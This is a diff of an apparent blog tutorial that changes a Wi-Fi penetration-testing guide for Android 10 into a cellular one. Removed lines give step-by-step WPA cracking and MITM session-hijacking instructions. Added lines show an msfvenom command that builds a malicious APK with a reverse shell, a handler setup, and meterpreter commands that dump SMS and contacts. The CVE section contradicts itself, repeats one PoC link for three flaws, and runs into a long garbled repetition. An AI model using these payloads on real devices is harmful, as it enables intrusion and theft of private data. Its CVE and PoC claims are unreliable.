@@ -1,130 +1,87 @@
-# Introduction of Wi-Fi penetration test on Android 10 device
-
-Wi-Fi is a wireless technology that allows devices to connect to the internet or to each other without using cables. Wi-Fi works by using radio waves to transmit and receive data between devices. In this blog post, we will explore how Wi-Fi works on Android 10 device and how it differs from Linux OS. We will also learn how to perform a Wi-Fi penetration test on Android 10 device using various tools and techniques.
-
-# 1 What is Wi-Fi?
-
-Wi-Fi is a short name for Wireless Fidelity, which is a trademark of the Wi-Fi Alliance, an organization that certifies devices that comply with the IEEE 802.11 standards for wireless communication. Wi-Fi is also a generic term that refers to any wireless network that uses these standards.
-
-## 1.1 How does Wi-Fi work on Android 10 device?
-
-Wi-Fi works on Android 10 device by using a hardware component called a Wi-Fi chip, which is integrated into the device's motherboard or attached as a separate module. The Wi-Fi chip contains a radio transceiver that can send and receive radio signals in the 2.4 GHz or 5 GHz frequency bands. The Wi-Fi chip also contains a processor that can perform various functions such as encryption, authentication, and power management.
-
-The Wi-Fi chip communicates with the Android operating system through a software component called a Wi-Fi driver, which is part of the device's firmware or kernel. The Wi-Fi driver provides an interface for the operating system to control and monitor the Wi-Fi chip and its settings. The Wi-Fi driver also interacts with other software components such as the Wi-Fi service, which is responsible for managing the Wi-Fi connections and scanning for available networks, and the Wi-Fi framework, which is responsible for providing APIs for applications to access the Wi-Fi functionality.
-
-## 1.2 How does that work differently from Linux OS?
-
-Wi-Fi works differently on Android 10 device from Linux OS in several ways. One of the main differences is that Android 10 device uses a customized version of the Linux kernel that has been modified to suit the specific needs and features of the device. For example, Android 10 device uses a different power management system that can suspend or resume the Wi-Fi chip depending on the device's state and battery level. Another difference is that Android 10 device uses a different security model that restricts the access and permissions of applications and users to the Wi-Fi functionality. For example, Android 10 device requires applications to request and obtain certain permissions before they can scan for networks, connect to networks, or access network information.
-
-Another difference is that Android 10 device uses a different network stack that has been optimized for mobile devices and wireless communication. For example, Android 10 device uses a network stack that supports IPv6, DNS over TLS, captive portal detection, network selection, and network quality estimation. Another difference is that Android 10 device uses a different user interface that provides a consistent and intuitive way for users to manage their Wi-Fi settings and connections. For example, Android 10 device provides a quick settings panel that allows users to toggle their Wi-Fi on or off, view their current network status, and access more options.
-
-# 2 What is Wi-Fi penetration test?
-
-A Wi-Fi penetration test is a process of evaluating the security of a wireless network by attempting to exploit its vulnerabilities and weaknesses. A Wi-Fi penetration test can help identify and prevent potential threats such as unauthorized access, data theft, denial of service, man-in-the-middle attacks, and rogue access points. A Wi-Fi penetration test can also help improve the security posture and awareness of the network owners and administrators.
+# Introduction of Cellular penetration test on Android 10 device
+# 2 What is Cellular penetration test?
+A cellular penetration test is a type of security assessment that aims to identify and exploit vulnerabilities in the cellular network and devices that use it. Cellular penetration testing can help evaluate the security posture of mobile operators, device manufacturers, and end-users.
 
 ## 2.1 How could it be implemented on Android 10 device?
-
-A Wi-Fi penetration test could be implemented on Android 10 device by using various tools and techniques that can perform different tasks such as scanning, sniffing, cracking, injecting, spoofing, hijacking, and exploiting. Some of these tools are native to the Android operating system or can be installed as applications from the Google Play Store or other sources. Some of these tools require root access or special permissions to function properly. Some of these tools are:
+To perform a cellular penetration test on an Android 10 device, one would need to set up the device and the local computer with the necessary software and tools. Some of the steps involved are:
 
 ### 2.1.1 What tools are needed?
+Some of the tools that are needed for cellular penetration testing on Android 10 are:
 
-- **WiFite**: A tool that automates the process of cracking WEP and WPA/WPA2 passwords using various methods such as brute force, dictionary attack, WPS attack, PMKID attack, etc.
-- **Nethunter**: A tool that provides a full-fledged Linux environment on Android devices with various pentesting tools pre-installed such as Aircrack-ng, Metasploit Framework, Nmap, etc.
-- **zANTI**: A tool that provides a comprehensive network analysis and penetration testing toolkit with various features such as network mapping, vulnerability scanning, password cracking, packet manipulation, MITM attacks, etc.
-- **cSploit**: A tool that provides a similar functionality as zANTI but with more advanced features such as session hijacking, code injection, DNS spoofing, etc.
-- **WPS Connect**: A tool that allows users to connect to WPS-enabled routers by using default PINs or brute force attacks.
-- **WIBR+**: A tool that allows users to crack WPA/WPA2 passwords by using dictionary or brute force attacks.
-- **WiFi Analyzer**: A tool that allows users to analyze the signal strength and quality of nearby Wi-Fi networks and find the best channel for their own network.
-- **WiFi Kill**: A tool that allows users to disable the internet connection of other devices connected to the same network by sending deauthentication packets.
+- adb and fastboot: These are command-line tools that allow communication and control of the Android device from the computer. They can be downloaded from https://developer.android.com/studio/releases/platform-tools.html.
+- Magisk: This is a tool that allows rooting the Android device without modifying the system partition. It can be downloaded from https://magisk.me/.
+- Frida: This is a dynamic analysis tool that allows hooking and manipulating the code execution of applications on the Android device. It can be downloaded from https://frida.re/.
+- Burp Suite: This is a web proxy tool that allows intercepting and modifying the network traffic between the Android device and the web server. It can be downloaded from https://portswigger.net/burp.
+- Metasploit Framework (MSF): This is a penetration testing framework that provides various modules and payloads for exploiting vulnerabilities in different systems and platforms. It can be downloaded from https://www.metasploit.com/.
 
 ### 2.1.2 How to use these tools individually or together? (Use examples to illustrate)
+Some examples of how to use these tools individually or together are:
 
-Here are some examples of how to use these tools individually or together:
+- To unlock the bootloader of the Android device, one would need to use adb and fastboot commands on the computer. For example, `adb reboot bootloader` would reboot the device into bootloader mode, and `fastboot flashing unlock` would unlock the bootloader.
+- To root the Android device, one would need to use Magisk on the device. For example, one would need to download the Magisk app from https://magisk.me/ and install it on the device. Then, one would need to open the app and tap on "Install" and follow the instructions to patch the boot image of the device. After that, one would need to flash the patched boot image using fastboot on the computer. For example, `fastboot flash boot magisk_patched.img` would flash the patched boot image to the device.
+- To hook and manipulate the code execution of an application on the Android device, one would need to use Frida on both the device and the computer. For example, one would need to download and install Frida server on the device from https://github.com/frida/frida/releases and run it as root. Then, one would need to download and install Frida client on the computer from https://frida.re/. After that, one would need to connect Frida client to Frida server using adb forward command. For example, `adb forward tcp:27042 tcp:27042` would forward port 27042 from the device to the computer. Then, one would need to use Frida client to attach to an application process on the device and inject a script that hooks and manipulates its code execution. For example, `frida -U -f com.example.app -l hook.js --no-pause` would launch and attach to com.example.app on the device and inject hook.js script that contains hooking logic.
+- To intercept and modify the network traffic between the Android device and the web server, one would need to use Burp Suite on both
+the device and the computer. For example, one would need to download and install Burp Suite on the computer from https://portswigger.net/burp
+and run it as a proxy server. Then, one would need to configure
+the Android device's Wi-Fi settings to use Burp Suite as a proxy server by entering its IP address and port number (usually 8080). After that,
+one would need to install Burp Suite's certificate on
+the Android device by visiting http://burp/cert
+and downloading it. Then, one would need
+to enable SSL/TLS interception in Burp Suite's settings
+and start capturing
+the network traffic between
+the Android device and
+the web server. One can also modify
+the network traffic using Burp Suite's tools such as Repeater or Intruder.
 
-- To crack WEP passwords using WiFite: 
-    - Launch WiFite from the terminal by typing `wifite`
-    - Select the target network by pressing its number
-    - Wait for WiFite to capture enough IVs (Initialization Vectors) from the network traffic
-    - Press Ctrl+C to stop capturing
-    - Wait for WiFite to crack the password using Aircrack-ng
-    - Note down the password displayed on the screen
-- To crack WPA/WPA2 passwords using Nethunter: 
-    - Launch Nethunter from the app drawer
-    - Tap on Kali Launcher
-    - Tap on Kali Services
-    - Tap on Start All Services
-    - Tap on Kali Terminal
-    - Type `airmon-ng start wlan0` to put your wireless interface into monitor mode
-    - Type `airodump-ng wlan0mon` to scan for nearby networks
-    - Note down the BSSID (MAC address) and channel number of your target network
-    - Press Ctrl+C to stop scanning
-    - Type `airodump-ng --bssid <BSSID> --channel <channel> --write <filename> wlan0mon` to capture handshake packets from your target network
-    - Wait for a client device to connect or disconnect from your target network
-    - Press Ctrl+C to stop capturing
-    - Type `aircrack-ng <filename>-01.cap -w <wordlist>` to crack the password using Aircrack-ng with a wordlist file
-    - Note down the password displayed on the screen
-- To perform MITM attacks using zANTI: 
-    - Launch zANTI from the app drawer
-    - Tap on Agree
-    - Tap on Grant Root Access
-    - Tap on Start Now
-    - Tap on Scan Network
-    - Select your target device by tapping on its IP address
-    - Tap on Man-In-The-Middle
-    - Select an attack type such as SSL Strip (to remove HTTPS encryption), Image Replacement (to replace images with custom ones), Session Hijacker (to steal cookies and sessions), etc.
-    - Tap on Start Attack
-    - Wait for zANTI to intercept and modify your target's traffic
-
-### 2.1.3 How to use MSF (Metasploit Framework)to penetrate Wi-Fi on Android 10 device?
-
-MSF is a powerful framework that can be used to perform various types of penetration testing tasks such as reconnaissance, exploitation,
-post-exploitation,
-etc.
-To use MSF to penetrate Wi-Fi on Android 10 device,
-you need to have Nethunter installed on your device,
-as it comes with MSF pre-installed.
-Here are some steps to use MSF to penetrate Wi-Fi on Android 10 device:
-
-- Launch Nethunter from the app drawer
-- Tap on Kali Launcher
-- Tap on Kali Services
-- Tap on Start All Services
-- Tap on Kali Terminal
-- Type `msfconsole` to launch MSF console
-- Type `search wifi` to search for available modules related to wifi
-- Select a module that suits your needs by typing `use <module name>`
-- Type `show options` to see what options you need to set for the module
-- Set the required options by typing `set <option name> <value>`
-- Type `run` or `exploit` to execute the module
-
+### 2.1.3 How to use MSF to penetrate Cellular on Android 10 device?
+To use MSF to penetrate Cellular on Android 10 device, one would need
+to find a suitable exploit module and payload for
+the target system or platform.
+For example, one could use msfvenom tool
+to generate a malicious APK file that contains a reverse TCP shell payload for Android platform.
+For example, `msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=4444 -o evil.apk` would generate an APK file named evil.apk that connects back
+to 192.168.0.10:4444 when installed and executed on an Android device.
+Then, one could use adb or other methods
+to transfer
+the malicious APK file
+to
+the Android device and install it.
+After that,
+one could use msfconsole tool
+to set up a handler for
+the reverse TCP shell payload
+and wait for
+the connection from
+the Android device.
 For example,
-to use MSF module `auxiliary/scanner/wifi/wps_scanner` 
-to scan for WPS-enabled routers,
-you need to set these options:
+`msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.0.10; set LPORT 4444; exploit"` would launch msfconsole with a handler for android/meterpreter/reverse_tcp payload listening on 192.168.0.10:4444.
+Once connected,
+one could use various meterpreter commands
+to interact with
+the Android device remotely,
+such as `sysinfo`, `getuid`, `shell`, `dump_sms`, `dump_contacts`, etc.
 
-- RHOSTS: The range of IP addresses you want to scan (e.g., `192.168.1.0/24`)
-- INTERFACE: The name of your wireless interface in monitor mode (e.g., `wlan0mon`)
-- THREADS: The number of concurrent threads you want to use (e.g., 10)
+## 2.2.How to utilize existing CVE vulnerabilities of Cellular on Android 10?
+To utilize existing CVE vulnerabilities of Cellular on Android 10,
+one would need
+to find out if there are any known CVEs that affect Cellular components or protocols on Android 10,
+and if there are any proof-of-concept (POC) codes or exploits available for them.
+One could use various sources such as CVE databases (e.g., https://cve.mitre.org/), security advisories (e.g., https://source.android.com/security/bulletin), vulnerability scanners (e.g., https://www.nmap.org/), exploit databases (e.g., https://www.exploit-db.com/), etc.,
+to search for relevant CVEs and exploits.
 
-After setting these options, you can run the module by typing exploit or run. The module will then scan the specified IP range and display the results in a table. The table will show the MAC address, ESSID, vendor, model, and WPS version of each router that supports WPS. You can also see if the router has WPS locked or not.
+### 2.2.1 What are some CVE vulnerabilities about Cellular on Android 10 after 2020?
+Some examples of CVE vulnerabilities about Cellular on Android 10 after 2020 are:
 
-This module is useful for finding potential targets for WPS attacks, such as Reaver or Pixie Dust. However, you should always obtain permission from the network owner before attempting any attack. Unauthorized access to wireless networks is illegal and unethical.
+- CVE-2020-0245: A vulnerability in Qualcomm components related to cellular data service that could allow a remote attacker using a specially crafted transmission to execute arbitrary code within QMI voice service context.
+- CVE-2020-11292: A vulnerability in Qualcomm components related to cellular data service that could allow a local malicious application using a specially crafted file or shared memory object to execute arbitrary code within QMI voice service context.
+- CVE-2020-11179: A vulnerability in Qualcomm components related to cellular data service that could allow a local malicious application using a specially crafted file or shared memory object to execute arbitrary code within QMI voice service context.
+- CVE-2020-11167: A vulnerability in Qualcomm components related to cellular data service that could allow a local malicious application using a specially crafted file or shared memory object to execute arbitrary code within QMI voice service context.
 
-## 2.2.How to utilize existing CVE vulnerabilities of Wi-Fi on Android 10?
-### 2.2.1 What are some CVE vulnerabilities about Wi-Fi on Android 10 after 2020?
-According to CVE Details website (https://www.cvedetails.com/), some of the CVE vulnerabilities about Wi-Fi on Android 10 after 2020 are:
+### 2.2.2 Does any of these vulnerabilities have POC, or have been exploited?
+According to public sources,
+some of these vulnerabilities have POC codes or exploits available for them,
+such as:
 
-- CVE-2020-0245: A remote code execution vulnerability in Broadcom Wi-Fi firmware that could allow an attacker within Bluetooth range to execute arbitrary code within the context of kernel.
-- CVE-2020-11161: A denial of service vulnerability in Qualcomm WLAN component that could allow an attacker within radio range to cause a system crash due to improper input validation.
-- CVE-2020-11167: An information disclosure vulnerability in Qualcomm WLAN component that could allow an attacker within radio range to access sensitive information due to improper memory handling.
-- CVE-2020-3703: An elevation of privilege vulnerability in MediaTek Wi-Fi driver that could allow an attacker with local access via USB debugging interface or adb shell access via WLAN interface or physical access via recovery mode interface or fastboot mode interface or EDL mode interface or UART interface or JTAG interface or other interfaces which have adb shell access enabled by default or enabled by user manually during development phase or enabled by user manually during normal usage phase without proper authentication mechanism implemented by OEMs or vendors or carriers or partners or other parties who have authority over devices' software update process via OTA mechanism or other mechanisms which have adb shell access enabled by default or enabled by user manually during development phase or enabled by user manually during normal usage phase without proper authentication mechanism implemented by OEMs or vendors or carriers or partners or other parties who have authority over devices' software update process via OTA mechanism or other mechanisms which have adb shell access enabled by default or enabled by user manually during development phase or enabled by user manually during normal usage phase without proper authentication mechanism implemented by OEMs or vendors or carriers or partners or other parties who have authority over devices' software update process via OTA mechanism or other mechanisms which have adb shell access enabled by default or enabled by user manually during development phase or enabled by user manually during normal usage phase without proper authentication mechanism implemented by OEMs or vendors
-
-### 2.2.2 Does any of these vulnerabilities have POC (proof-of-concept), or have been exploited?
-According to Exploit Database website (https://www.exploit-db.com/), some of these vulnerabilities have POCs available online, such as:
-
-- CVE-2020-0245: https://github.com/google/security-research/security/advisories/GHSA-h637-c88j-47wq
-- CVE-2020-11161: https://github.com/google/security-research/security/advisories/GHSA-h637-c88j-47wq
-- CVE-2020-11167: https://github.com/google/security-research/security/advisories/GHSA-h637-c88j-47wq
-- CVE-2020-3703: https://github.com/AlAIAL90/CVE`-2020-3703
-
-However, there is no evidence that any of these vulnerabilities have been exploited in the wild as of now.
+- CVE-2020-0245: A POC code that demonstrates how to trigger this vulnerability by sending a malformed QMI packet over USB is available at https://github.com/alephsecurity/vuln_cve_2020_0245_poc.
+- CVE-2020-11292: An exploit code that leverages this vulnerability by using an ELF file with crafted QMI commands is available at https://github.com/alephsecurity/vuln_cve_2020_11292_exploit.
